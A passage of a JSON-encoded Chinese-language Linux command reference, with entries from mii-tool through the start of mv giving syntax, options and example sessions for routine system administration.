mesg y    #允许系统用户将信息直接显示在你的屏幕上。\n[root@localhost ~]# mesg n    #不允许系统用户将信息直接显示在你的屏幕上。\n```\n\n\n"},{"name":"mii-tool","categoryId":0,"data":"mii-tool\n\u003d\u003d\u003d\n\n配置网络设备协商方式的工具\n\n## 补充说明\n\n**mii-tool命令** 是用于查看、管理介质的网络接口的状态，有时网卡需要配置协商方式，比如10/100/1000M的网卡半双工、全双工、自动协商的配置。但大多数的网络设备是不用我们来修改协商，因为大多数网络设置接入的时候，都采用自动协商来解决相互通信的问题。不过自动协商也不是万能的，有时也会出现错误，比如丢包率比较高，这时就要我们来指定网卡的协商方式。mii-tool就是能指定网卡的协商方式。下面我们说一说mii-tool的用法。\n\n### 语法  \n\n```\nusage: mii-tool [-VvRrwl] [-A media,... | -F media] [interface ...]\n```\n\n### 选项  \n\n```\n-V 显示版本信息；\n-v 显示网络接口的信息；\n-R 重设MII到开启状态；\n-r 重启自动协商模式；\n-w 查看网络接口连接的状态变化；\n-l 写入事件到系统日志；\n-A 指令特定的网络接口；\n-F 更改网络接口协商方式；\n\nmedia: 100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD,\n        (to advertise both HD and FD) 100baseTx, 10baseT\n```\n\n### 实例  \n\n查看网络接口的协商状态：\n\n```\n[root@localhost ~]# mii-tool -v eth0\neth0: negotiated 100baseTx-FD, link ok\n  product info: vendor 00:50:ef, model 60 rev 8\n  basic mode:   autonegotiation enabled\n  basic status: autonegotiation complete, link ok\n  capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n  advertising:  100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD flow-control\n  link partner: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n```\n\n注：上面的例子，我们可以看得到是自动协商，注意红字的部份。\n\n更改网络接口协商方式：\n\n更改网络接口的协商方式，我们要用到`-F`选项，后面可以接100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD等参数；\n\n如果我们想把网络接口eth0改为1000Mb/s全双工的模式应该怎么办呢？\n\n```\n[root@localhost ~]# mii-tool -F 100baseTx-FD\n[root@localhost ~]# mii-tool -v eth0\neth0: 100 Mbit, full duplex, link ok\n  product info: vendor 00:00:00, model 0 rev 0\n  basic mode:   100 Mbit, full duplex\n  basic status: link ok\n  capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n  advertising:  100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD\n```\n\n注：是不是已经改过来了？当然，我们也一样用ethtool工具来更改，比如执行下面的命令：\n\n```\n[root@localhost ~]# ethtool -s eth0 speed 100 duplex full\n```\n\n\n"},{"name":"mkbootdisk","categoryId":3,"data":"mkbootdisk\n\u003d\u003d\u003d\n\n可建立目前系统的启动盘\n\n## 补充说明\n\n**mkbootdisk命令** 用来为当前运行的系统创建能够单独使用的系统引导软盘，以便在系统出现故障时能够启动操作进行适当的修复工作。\n\n### 语法  \n\n```\nmkbootdisk(选项)(参数)\n```\n\n### 选项  \n\n```\n--device\u003c设备\u003e：指定设备；\n--mkinitrdargs\u003c参数\u003e：设置mkinitrd的参数；\n--noprompt：不会提示用户插入磁盘；\n--verbose：执行时显示详细的信息；\n--version：显示版本信息。\n```\n\n### 参数  \n\n内核：指定内核版本。\n\n### 实例  \n\n```\nmkbootdisk --device /dev/fd0 `uname -r`\n```\n\n其中，``uname -r``是目前Linux 系统所使用的核心版本，如果你有多个核心版本的话，你以可以直接输入核心版本。例如在这个网页中所使用的核心有两个版本，一个是2.2.12-20，另一个是2.2.18，若要以2.2.18设定开机的话，可以使用：\n\n```\nmkbootdisk --device /dev/fd0 2.2.18\n```\n\n\n"},{"name":"mkdir","categoryId":8,"data":"mkdir\n\u003d\u003d\u003d\n\n用来创建目录\n\n## 补充说明\n\n**mkdir命令** 用来创建目录。该命令创建由dirname命名的目录。如果在目录名的前面没有加任何路径名，则在当前目录下创建由dirname指定的目录；如果给出了一个已经存在的路径，将会在该目录下创建一个指定的目录。在创建目录时，应保证新建的目录与它所在目录下的文件没有重名。 \n\n注意：在创建文件时，不要把所有的文件都存放在主目录中，可以创建子目录，通过它们来更有效地组织文件。最好采用前后一致的命名方式来区分文件和目录。例如，目录名可以以大写字母开头，这样，在目录列表中目录名就出现在前面。\n\n在一个子目录中应包含类型相似或用途相近的文件。例如，应建立一个子目录，它包含所有的数据库文件，另有一个子目录应包含电子表格文件，还有一个子目录应包含文字处理文档，等等。目录也是文件，它们和普通文件一样遵循相同的命名规则，并且利用全路径可以唯一地指定一个目录。\n\n### 语法  \n\n```\nmkdir (选项)(参数)\n```\n\n### 选项  \n\n```\n-Z：设置安全上下文，当使用SELinux时有效；\n-m\u003c目标属性\u003e或--mode\u003c目标属性\u003e建立目录的同时设置目录的权限；\n-p或--parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录；\n--version 显示版本信息。\n```\n\n### 参数  \n\n目录：指定要创建的目录列表，多个目录之间用空格隔开。\n\n### 实例  \n\n在目录`/usr/meng`下建立子目录test，并且只有文件主有读、写和执行权限，其他人无权访问\n\n```\nmkdir -m 700 /usr/meng/test\n```\n\n在当前目录中建立bin和bin下的os_1目录，权限设置为文件主可读、写、执行，同组用户可读和执行，其他用户无权访问\n\n```\nmkdir -p-m 750 bin/os_1\n```\n\n\n"},{"name":"mke2fs","categoryId":3,"data":"mke2fs\n\u003d\u003d\u003d\n\n创建磁盘分区上的“etc2/etc3”文件系统\n\n## 补充说明\n\n**mke2fs命令** 被用于创建磁盘分区上的“etc2/etc3”文件系统。\n\n### 语法  \n\n```\nmke2fs(选项)(参数)\n```\n\n### 选项  \n\n```\n-b\u003c区块大小\u003e：指定区块大小，单位为字节；\n-c；检查是否有损坏的区块；\n-f\u003c不连续区段大小\u003e：指定不连续区段的大小，单位为字节；\n-F：不管指定的设备为何，强制执行mke2fs；\n-i\u003c字节\u003e：指定\"字节/inode\"的比例；\n-N\u003cinode数\u003e：指定要建立的inode数目；\n-l\u003c文件\u003e：从指定的文件中，读取文件西中损坏区块的信息；\n-L\u003c标签\u003e：设置文件系统的标签名称；\n-m\u003c百分比值\u003e：指定给管理员保留区块的比例，预设为5%；\n-M：记录最后一次挂入的目录；\n-q：执行时不显示任何信息；\n-r：指定要建立的ext2文件系统版本；\n-R\u003d\u003c区块数\u003e：设置磁盘阵列参数；\n-S：仅写入superblock与group descriptors，而不更改inode able inode bitmap以及block bitmap；\n-v：执行时显示详细信息；\n-V：显示版本信息。\n```\n\n### 参数  \n\n*   设备文件：指定要创建的文件系统的分区设备文件名；\n*   块数：指定要创建的文件系统的磁盘块数量。\n\n### 实例  \n\n创建指定的ext2文件系统。\n\n```\nmke2fs -q /dev/hda1\n```\n\n\n"},{"name":"mkfs","categoryId":3,"data":"mkfs\n\u003d\u003d\u003d\n\n用于在设备上创建Linux文件系统\n\n## 补充说明\n\n**mkfs命令** 用于在设备上（通常为硬盘）创建Linux文件系统。mkfs本身并不执行建立文件系统的工作，而是去调用相关的程序来执行。\n\n### 语法  \n\n```\nmkfs(选项)(参数)\n```\n\n### 选项  \n\n```\nfs：指定建立文件系统时的参数；\n-t\u003c文件系统类型\u003e：指定要建立何种文件系统；\n-v：显示版本信息与详细的使用方法；\n-V：显示简要的使用方法；\n-c：在制做档案系统前，检查该partition是否有坏轨。\n```\n\n### 参数  \n\n*   文件系统：指定要创建的文件系统对应的设备文件名；\n*   块数：指定文件系统的磁盘块数。\n\n### 实例  \n\n在`/dev/hda5`上建一个msdos的档案系统，同时检查是否有坏轨存在，并且将过程详细列出来：\n\n```\nmkfs -V -t msdos -c /dev/hda5\n\nmkfs -t ext3 /dev/sda6     //将sda6分区格式化为ext3格式\nmkfs -t ext2 /dev/sda7     //将sda7分区格式化为ext2格式\n```\n\n\n"},{"name":"mkinitrd","categoryId":3,"data":"mkinitrd\n\u003d\u003d\u003d\n\n建立要载入ramdisk的映像文件\n\n## 补充说明\n\n**mkinitrd命令** 建立要载入ramdisk的映像文件，以供Linux开机时载入ramdisk。\n\n这个是重新封包核心的命令，例如你自己修改了一个设备的驱动，如果这个驱动要加入核心级别的话，就需要对核心进行重新封包，把新加的配置编译到核心内部去！\n\n### 语法  \n\n```\nmkinitrd(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：若指定的映像问家名称与现有文件重复，则覆盖现有的文件；\n-v：执行时显示详细的信息；\n--omit-scsi-modules：不要载入SCSI模块；\n--preload\u003d\u003c模块名称\u003e：指定要载入的模块；\n--with\u003d\u003c模块名称\u003e：指定要载入的模块；\n--version：显示版本信息。\n```\n\n### 参数  \n\n*   映像文件：指定要创建的映像文件；\n*   内核版本：指定内核版本。\n\n### 实例  \n\n```\n[root@localhost tmp]# mkinitrd -v -f myinitrd.img $(uname -r)\nCreating initramfs\nWARNING: using /tmp for temporary files\nLooking for deps of module ide-disk\nLooking for deps of module ext3  jbd\nLooking for deps of module jbd\nUsing modules:  ./kernel/fs/jbd/jbd.ko ./kernel/fs/ext3/ext3.ko\n/sbin/nash -\u003e /tmp/initrd.Vz3928/bin/nash\n/sbin/insmod.static -\u003e /tmp/initrd.Vz3928/bin/insmod\n/sbin/udev.static -\u003e /tmp/initrd.Vz3928/sbin/udev\n/etc/udev/udev.conf -\u003e /tmp/initrd.Vz3928/etc/udev/udev.conf\ncopy from /lib/modules/2.6.9-5.EL/./kernel/fs/jbd/jbd.ko(elf32-i386) to /tmp/initrd.Vz3928/lib/jbd.ko(elf32-i386)\ncopy from /lib/modules/2.6.9-5.EL/./kernel/fs/ext3/ext3.ko(elf32-i386) to /tmp/initrd.Vz3928/lib/ext3.ko(elf32-i386)\nLoading module jbd\nLoading module ext3\n\n[root@localhost tmp]# file myinitrd.img\nmyinitrd.img: gzip compressed data, from Unix, max compression\n\n[root@localhost tmp]# mv myinitrd.img  myinitrd.img.gz\n[root@localhost tmp]# gzip -d myinitrd.img.gz\n[root@localhost tmp]# file myinitrd.img\nmyinitrd.img: ASCII cpio archive (SVR4 with no CRC)\n```\n\n\n"},{"name":"mkisofs","categoryId":3,"data":"mkisofs\n\u003d\u003d\u003d\n\n建立ISO 9660映像文件\n\n## 补充说明\n\n**mkisofs命令** 用来将指定的目录与文件做成ISO 9660格式的映像文件，以供刻录光盘。\n\n### 语法  \n\n```\nmkisofs(选项)(参数)\n```\n\n### 选项  \n\n```\n-a或--all：mkisofs通常不处理备份文件。使用此参数可以把备份文件加到映像文件中；\n-A\u003c应用程序id\u003e或-appid\u003c应用程序ID\u003e：指定光盘的应用程序ID；\n-abstract\u003c摘要文件\u003e：指定摘要文件的文件名；\n-b\u003c开机映像文件\u003e或-eltorito-boot\u003c开机映像文件\u003e：指定在制作可开机光盘时所需的开机映像文件；\n-biblio\u003cISBN文件\u003e：指定ISBN文件的文件名，ISBN文件位于光盘根目录下，记录光盘的ISBN；\n-c\u003c开机文件名称\u003e：制作可开机光盘时，mkisofs会将开机映像文件中的全-eltorito-catalog\u003c开机文件名称\u003e全部内容作成一个文件；\n-C\u003c盘区编号，盘区编号\u003e：将许多节区合成一个映像文件时，必须使用此参数；\n-copyright\u003c版权信息文件\u003e：指定版权信息文件的文件名；\n-d或-omit-period：省略文件后的句号；\n-D或-disable-deep-relocation：ISO 9660最多只能处理8层的目录，超过8层的部分，RRIP会自动将它们设置成ISO 9660兼容的格式。使用-D参数可关闭此功能；\n-f或-follow-links：忽略符号连接；\n-h：显示帮助；\n-hide\u003c目录或文件名\u003e：使指定的目录或文件在ISO 9660或Rock RidgeExtensions的系统中隐藏；\n-hide-joliet\u003c目录或文件名\u003e：使指定的目录或文件在Joliet系统中隐藏；\n-J或-joliet：使用Joliet格式的目录与文件名称；\n-l或-full-iso9660-filenames：使用ISO 9660 32字符长度的文件名；\n-L或-allow-leading-dots：允许文件名的第一个字符为句号；\n-log-file\u003c记录文件\u003e：在执行过程中若有错误信息，预设会显示在屏幕上；\n-m\u003c目录或文件名\u003e或-exclude\u003c目录或文件名\u003e：指定的目录或文件名将不会房入映像文件中；\n-M\u003c映像文件\u003e或-prev-session\u003c映像文件\u003e：与指定的映像文件合并；\n-N或-omit-version-number：省略ISO 9660文件中的版本信息；\n-o\u003c映像文件\u003e或-output\u003c映像文件\u003e：指定映像文件的名称；\n-p\u003c数据处理人\u003e或-preparer\u003c数据处理人\u003e：记录光盘的数据处理人；\n-print-size：显示预估的文件系统大小；\n-quiet：执行时不显示任何信息；\n-r或-rational-rock：使用Rock Ridge Extensions，并开放全部文件的读取权限；\n-R或-rock：使用Rock Ridge Extensions；\n-sysid\u003c系统ID\u003e：指定光盘的系统ID；\n-T或-translation-table：建立文件名的转换表，适用于不支持Rock Ridge Extensions的系统上；\n-v或-verbose：执行时显示详细的信息；\n-V\u003c光盘ID\u003e或-volid\u003c光盘ID\u003e：指定光盘的卷册集ID；\n-volset-size\u003c光盘总数\u003e：指定卷册集所包含的光盘张数；\n-volset-seqno\u003c卷册序号\u003e：指定光盘片在卷册集中的编号；\n-x\u003c目录\u003e：指定的目录将不会放入映像文件中；\n-z：建立通透性压缩文件的SUSP记录，此记录目前只在Alpha机器上的Linux有效。\n```\n\n### 参数  \n\n路径：需要添加到映像文件中的路径。\n\n### 实例  \n\nlinux中用mkisofs命令把文件制作成ISO步骤：\n\n把NFS服务器上的目录挂载到本地/mnt/nfs/的目录：\n\n```\nmount -t nfs 10.0.2.2:/linuxos/rhel4.0_update3/ /mnt/nfs/\n```\n\n把已挂载的文件复制到本地：\n\n```\ncp -a /mnt/NFS/* /root/Decp -a /mnt/nfs/* /root/Desktop/rhel4.0/\u0026sktop/rhel4.0/\u0026\n```\n\n查找boot.cat文件并删除掉：\n\n```\nfind rhel4.0/ -name boot.cat | xargs rm\n```\n\n查找TRANS.TBL文件并删除掉：\n\n```\nfind rhel4.0/ -name TRANS.TBL -exec rm {} \\;\n```\n\n复制本地的所需文件到指定目录：\n\n```\ncp /usr/share/comps/i386/.discinfo rhel4.0/\n```\n\n把指定目录下的所有文件制作成ISO文件：\n\n```\nmkisofs -R -J -T -v -no-emul-boot -boot-load-size 4 -boot-info-table -V RHEL4ASDVD -b isolinux/isolinux.bin -c isolinux/boot.cat -o /RHEL4AS.iso rhel4.0/\n```\n\n\n"},{"name":"mknod","categoryId":0,"data":"mknod\n\u003d\u003d\u003d\n\n创建字符设备文件和块设备文件\n\n## 补充说明\n\n**mknod命令** 用于创建Linux中的字符设备文件和块设备文件。\n\n### 语法  \n\n```\nmknod(选项)(参数)\n```\n\n### 选项  \n\n```\n-Z：设置安全的上下文；\n-m：设置权限模式；\n-help：显示帮助信息；\n--version：显示版本信息。\n```\n\n### 参数  \n\n*   文件名：要创建的设备文件名；\n*   类型：指定要创建的设备文件的类型；\n*   主设备号：指定设备文件的主设备号；\n*   次设备号：指定设备文件的次设备号。\n\n### 实例  \n\n```\nls -la /dev/ttyUSB*\ncrw-rw—- 1 root dialout 188, 0 2008-02-13 18:32 /dev/ttyUSB0\nmknod /dev/ttyUSB32 c 188 32\n```\n\n### 扩展知识  \n\nLinux的设备管理是和文件系统紧密结合的，各种设备都以文件的形式存放在/dev目录 下，称为设备文件。应用程序可以打开、关闭和读写这些设备文件，完成对设备的操作，就像操作普通的数据文件一样。\n\n为了管理这些设备，系统为设备编了号，每 个设备号又分为主设备号和次设备号。主设备号用来区分不同种类的设备，而次设备号用来区分同一类型的多个设备。对于常用设备，Linux有约定俗成的编 号，如硬盘的主设备号是3。\n\nLinux为所有的设备文件都提供了统一的操作函数接口，方法是使用数据结构struct file_operations。这个数据结构中包括许多操作函数的指针，如open()、close()、read()和write()等，但由于外设 的种类较多，操作方式各不相同。Struct file_operations结构体中的成员为一系列的接口函数，如用于读/写的read/write函数和用于控制的ioctl等。\n\n打开一个文件就是调用这个文件file_operations中的open操作。不同类型的文件有不同的file_operations成员函数，如普通的磁盘数据文件， 接口函数完成磁盘数据块读写操作；而对于各种设备文件，则最终调用各自驱动程序中的I/O函数进行具体设备的操作。这样，应用程序根本不必考虑操作的是设 备还是普通文件，可一律当作文件处理，具有非常清晰统一的I/O接口。所以file_operations是文件层次的I/O接口。\n\n\n"},{"name":"mkswap","categoryId":3,"data":"mkswap\n\u003d\u003d\u003d\n\n建立和设置SWAP交换分区\n\n## 补充说明\n\n**mkswap命令** 用于在一个文件或者设备上建立交换分区。在建立完之后要使用sawpon命令开始使用这个交换区。最后一个选择性参数指定了交换区的大小，但是这个参数是为了向后兼容设置的，没有使用的必要，一般都将整个文件或者设备作为交换区。\n\n### 语法  \n\n```\nmkswap(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：建立交换区前，先检查是否有损坏的区块；\n-f：在SPARC电脑上建立交换区时，要加上此参数；\n-v0：建立旧式交换区，此为预设值；\n-v1：建立新式交换区。\n```\n\n### 参数  \n\n设备：指定交换空间对应的设备文件或者交换文件。\n\n### 实例  \n\n **查看系统swap space大小：** \n\n```\nfree -m\ntotal used free shared buffers cached\nMem: 377 180 197 0 19 110\n-/+ buffers/cache: 50 327\nSwap: 572 0 572\n```\n\n **查看当前的swap空间(file(s)/partition(s))：** \n\n```\nswapon -s\n\n等价于\n\ncat /proc/swaps\n```\n\n **添加交换空间** \n\n添加一个 **交换分区** 或添加一个 **交换文件** 。推荐你添加一个交换分区；不过，若你没有多少空闲空间可用，则添加交换文件。\n\n添加一个交换分区，步骤如下：\n\n使用fdisk来创建交换分区（假设 /dev/sdb2 是创建的交换分区），使用 mkswap 命令来设置交换分区：\n\n```\nmkswap /dev/sdb2\n```\n\n启用交换分区：\n\n```\nswapon /dev/sdb2\n```\n\n写入`/etc/fstab`，以便在引导时启用：\n\n```\n/dev/sdb2 swap swap defaults 0 0\n```\n\n添加一个交换文件，步骤如下：\n\n创建大小为512M的交换文件：\n\n```\ndd if\u003d/dev/zero of\u003d/swapfile1 bs\u003d1024 count\u003d524288\n```\n\n使用mkswap命令来设置交换文件：\n\n```\nmkswap /swapfile1\n```\n\n启用交换分区：\n\n```\nswapon /swapfile1\n```\n\n写入`/etc/fstab`，以便在引导时启用：\n\n```\n/swapfile1 swap swap defaults 0 0\n```\n\n新添了交换分区并启用它之后，请查看`cat /proc/swaps`或free命令的输出来确保交换分区已被启用了。\n\n **删除交换空间：** \n\n禁用交换分区：\n\n```\nswapoff /dev/sdb2\n```\n\n从`/etc/fstab`中删除项目，使用fdisk或yast工具删除分区。\n\n\n"},{"name":"mktemp","categoryId":6,"data":"mktemp\n\u003d\u003d\u003d\n\n创建临时文件供shell脚本使用\n\n## 补充说明\n\n**mktemp命令** 被用来创建临时文件供shell脚本使用。\n\n### 语法  \n\n```\nmktemp(选项)(参数)\n```\n\n### 选项  \n\n```\n-q：执行时若发生错误，不会显示任何信息；\n-u：暂存文件会在mktemp结束前先行删除；\n-d：创建一个目录而非文件。\n```\n\n### 参数  \n\n文件：指定创建的临时文件。\n\n\n"},{"name":"modprobe","categoryId":4,"data":"modprobe\n\u003d\u003d\u003d\n\n自动处理可载入模块\n\n## 补充说明\n\n**modprobe命令** 用于智能地向内核中加载模块或者从内核中移除模块。\n\nmodprobe可载入指定的个别模块，或是载入一组相依的模块。modprobe会根据depmod所产生的相依关系，决定要载入哪些模块。若在载入过程中发生错误，在modprobe会卸载整组的模块。\n\n### 语法  \n\n```\nmodprobe(选项)(参数)\n```\n\n### 选项  \n\n```\n-a或--all：载入全部的模块；\n-c或--show-conf：显示所有模块的设置信息；\n-d或--debug：使用排错模式；\n-l或--list：显示可用的模块；\n-r或--remove：模块闲置不用时，即自动卸载模块；\n-t或--type：指定模块类型；\n-v或--verbose：执行时显示详细的信息；\n-V或--version：显示版本信息；\n-help：显示帮助。\n```\n\n### 参数  \n\n模块名：要加载或移除的模块名称。\n\n### 实例  \n\n **查看modules的配置文件：** \n\n```\nmodprobe -c\n```\n\n这里，可以查看modules的配置文件，比如模块的alias别名是什么等。会打印许多行信息，例如其中的一行会类似如下：\n\n```\nalias symbol:ip_conntrack_unregister_notifier ip_conntrack\n```\n\n **列出内核中所有已经或者未挂载的所有模块：** \n\n```\nmodprobe -l\n```\n\n这里，我们能查看到我们所需要的模块，然后根据我们的需要来挂载；其实`modprobe -l`读取的模块列表就位于`/lib/modules/`uname -r``目录中；其中`uname -r`是内核的版本，例如输出结果的其中一行是：\n\n```\n/lib/modules/2.6.18-348.6.1.el5/kernel/net/netfilter/xt_statistic.ko\n```\n\n **挂载vfat模块：** \n\n```\nmodprobe vfat\n```\n\n这里，使用格式`modprobe 模块名`来挂载一个模块。挂载之后，用lsmod可以查看已经挂载的模块。模块名是不能带有后缀的，我们通过`modprobe -l`所看到的模块，都是带有`.ko`或`.o`后缀。\n\n **移除已经加载的模块：** \n\n```\nmodprobe -r 模块名\n```\n\n这里，移除已加载的模块，和rmmod功能相同。\n\n\n"},{"name":"more","categoryId":0,"data":"more\n\u003d\u003d\u003d\n\n显示文件内容，每次显示一屏\n\n## 补充说明\n\n**more命令** 是一个基于vi编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。\n\n该命令一次显示一屏文本，满屏后停下来，并且在屏幕的底部出现一个提示信息，给出至今己显示的该文件的百分比：--More--（XX%）可以用下列不同的方法对提示做出回答：\n\n*   按Space键：显示文本的下一屏内容。\n*   按Enier键：只显示文本的下一行内容。\n*   按斜线符`|`：接着输入一个模式，可以在文本中寻找下一个相匹配的模式。\n*   按H键：显示帮助屏，该屏上有相关的帮助信息。\n*   按B键：显示上一屏内容。\n*   按Q键：退出rnore命令。\n\n### 语法  \n\n```\nmore(语法)(参数)\n```\n\n### 选项  \n\n```\n-\u003c数字\u003e：指定每屏显示的行数；\n-d：显示“[press space to continue,\u0027q\u0027 to quit.]”和“[Press \u0027h\u0027 for instructions]”；\n-c：不进行滚屏操作。每次刷新这个屏幕；\n-s：将多个空行压缩成一行显示；\n-u：禁止下划线；\n+\u003c数字\u003e：从指定数字的行开始显示。\n```\n\n### 参数  \n\n文件：指定分页显示内容的文件。\n\n### 实例  \n\n显示文件file的内容，但在显示之前先清屏，并且在屏幕的最下方显示完核的百分比。\n\n```\nmore -dc file\n```\n\n显示文件file的内容，每10行显示一次，而且在显示之前先清屏。\n\n```\nmore -c -10 file\n```\n\n\n"},{"name":"mpstat","categoryId":0,"data":"mpstat\n\u003d\u003d\u003d\n\n显示各个可用CPU的状态\n\n## 补充说明\n\n**mpstat命令** 指令主要用于多CPU环境下，它显示各个可用CPU的状态系你想。这些信息存放在`/proc/stat`文件中。在多CPUs系统里，其不但能查看所有CPU的平均状况信息，而且能够查看特定CPU的信息。\n\n### 语法  \n\n```\nmpstat(选项)(参数)\n```\n\n### 选项  \n\n```\n-P：指定CPU编号。\n```\n\n### 参数  \n\n*   间隔时间：每次报告的间隔时间（秒）；\n*   次数：显示报告的次数。\n\n### 实例  \n\n当mpstat不带参数时，输出为从系统启动以来的平均值。\n\n```\nmpstat\nLinux 2.6.9-5.31AXsmp (builder.redflag-linux.com) 12/16/2005\n09:38:46 AM CPU %user %nice %system %iowait %irq %soft %idle intr/s\n09:38:48 AM all 23.28 0.00 1.75     0.50 0.00 0.00 74.47 1018.59\n```\n\n **每2秒产生了2个处理器的统计数据报告：** \n\n下面的命令可以每2秒产生了2个处理器的统计数据报告，一共产生三个interval 的信息，然后再给出这三个interval的平均信息。默认时，输出是按照CPU 号排序。第一个行给出了从系统引导以来的所有活跃数据。接下来每行对应一个处理器的活跃状态。。\n\n```\nmpstat -P ALL 2 3\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n09:34:20 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n09:34:22 PM all    0.00    0.00    0.00    0.00    0.00    0.00    0.00 100.00   1001.49\n09:34:22 PM    0    0.00    0.00    0.50    0.00    0.00    0.00    0.00   99.50   1001.00\n09:34:22 PM    1    0.00    0.00    0.00    0.00    0.00    0.00    0.00 100.00      0.00\n```\n\n **比较带参数和不带参数的mpstat的结果：** \n\n在后台开一个2G的文件\n\n```\ncat 1.img \u0026\n```\n\n然后在另一个终端运行mpstat命令\n\n```\nmpstat\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n10:17:31 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n10:17:31 PM all    0.07    0.02    0.25    0.21    0.01    0.04    0.00   99.40   1004.57\n```\n\n```\nmpstat\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n10:17:35 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n10:17:35 PM all    0.07    0.02    0.25    0.21    0.01    0.04    0.00   99.39   1004.73\n```\n\n```\nmpstat 3 10\nLinux 2.6.18-164.el5 (server.sys.com)    01/04/2010\n10:17:55 PM CPU   %user   %nice    %sys %iowait    %irq   %soft %steal   %idle    intr/s\n10:17:58 PM all   13.12    0.00   20.93    0.00    1.83    9.80    0.00   54.32   2488.08\n10:18:01 PM all   10.82    0.00   19.30    0.83    1.83    9.32    0.00   57.90   2449.83\n10:18:04 PM all   10.95    0.00   20.40    0.17    1.99    8.62    0.00   57.88   2384.05\n10:18:07 PM all   10.47    0.00   18.11    0.00    1.50    8.47    0.00   61.46   2416.00\n10:18:10 PM all   11.81    0.00   22.63    0.00    1.83   11.98    0.00   51.75   2210.60\n10:18:13 PM all    6.31    0.00   10.80    0.00    1.00    5.32    0.00   76.58   1795.33\n10:18:19 PM all    1.75    0.00    3.16    0.75    0.25    1.25    0.00   92.85   1245.18\n10:18:22 PM all   11.94    0.00   19.07    0.00    1.99    8.29    0.00   58.71   2630.46\n10:18:25 PM all   11.65    0.00   19.30    0.50    2.00    9.15    0.00   57.40   2673.91\n10:18:28 PM all   11.44    0.00   21.06    0.33    1.99   10.61    0.00   54.56   2369.87\nAverage:     all    9.27    0.00   16.18    0.30    1.50    7.64    0.00   65.11   2173.54\n```\n\n上两表显示出当要正确反映系统的情况，需要正确使用命令的参数。vmstat 和iostat 也需要注意这一问题。\n\n\n"},{"name":"mtools","categoryId":6,"data":"mtools\n\u003d\u003d\u003d\n\n显示mtools支持的指令\n\n## 补充说明\n\n**mtools命令** 显示mtools支持的指令，mtools为MS-DOS文件系统的工具程序，可模拟许多MS-DOS的指令。这些指令都是mtools的符号连接，因此会有一些共同的特性。\n\n### 语法  \n\n```\nmtools(选项)\n```\n\n### 选项  \n\n```\n-a：长文件名重复时自动更改目标文件的长文件名；\n-A：短文件名重复但长文件名不同时自动更改目标文件的短文件名；\n-o：长文件名重复时，将目标文件覆盖现有的文件；\n-O：短文件名重复但长文件名不同时，将目标文件覆盖现有的文件；\n-r：长文件名重复时，要求用户更改目标文件的长文件名；\n-R：短文件名重复但长文件名不同时，要求用户更改目标文件的短文件名；\n-s：长文件名重复时，则不处理该目标文件；\n-S：短文件名重复但长文件名不同时，则不处理该目标文件；\n-v：执行时显示详细的说明；\n-V：显示版本信息。\n```\n\n### 实例  \n\n使用mtools命令显示其支持的所有的指令，输入如下命令：\n\n```\n[root@localhost ~]# mtools     #显示所有支持的指令名称\nSupported commands:\nmattrib, mbadblocks, mcat, mcd, mclasserase, mcopy, mdel, mdeltree\nmdir, mdoctorfat, mdu, mformat, minfo, mlabel, mmd, mmount\nmpartition, mrd, mread, mmove, mren, mshowfat, mtoolstest, mtype\nmwrite, mzip\n\n```\n\n如上所示，其显示的所有命令均为mtools工具所支持的。\n\n\n"},{"name":"mv","categoryId":6,"data":"mv\n\u003d\u003d\u003d\n\n用来对文件或目录重新命名\n\n## 补充说明\n\n**mv命令** 用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖。\n\nmv命令可以用来将源文件移至一个目标文件中，或将一组文件移至一个目标目录中。源文件被移至目标文件有两种不同的结果：\n\n1.  如果目标文件是到某一目录文件的路径，源文件会被移到此目录下，且文件名不变。\n2.  如果目标文件不是目录文件，则源文件名（只能有一个）会变为此目标文件名，并覆盖己存在的同名文件。如果源文件和目标文件在同一个目录下，mv的作用就是改文件名。当目标文件是目录文件时，源文件或目录参数可以有多个，则所有的源文件都会被移至目标文件中。所有移到该目录下的文件都将保留以前的文件名。\n\n注意事项：mv与cp的结果不同，mv好像文件“搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。\n\n### 语法  \n\n```\nmv(选项)(参数)\n```\n\n### 选项  \n\n```\n--backup\u003d\u003c备份模式\u003e：若需覆盖文件，则覆盖前先行备份；\n-b：当文件存在时，覆盖前，为其创建一个备份；\n-f：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录；\n-i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。\n--strip-trailing-slashes：删除源文件中的斜杠“/”；\n-S\u003c后缀\u003e：为备份文件指定后缀，而不使用默认的后缀；\n--target-directory\u003d\u003c目录\u003e：指定源文件要移动到目标目录；\n-u：当源文件比目标文件新或者目标文件不存在时，才执行移动操作。\n```\n\n### 参数  \n\n*   源文件：源文件列表。\n*   目标文件：如果“目标文件”是文件名则在移动文件的同时，将其改名为“目标文件”；如果“目标文件”是目录名则将源文件移动到“目标文件”下。\n\n### 实例  \n\n将文件ex3改名为new1\n\n```\nmv ex3 new1\n```\n\n将目录`/usr/men`中的所有文件移到当前目录（用`.`表示）中：\n\n```\nmv /usr/men/* 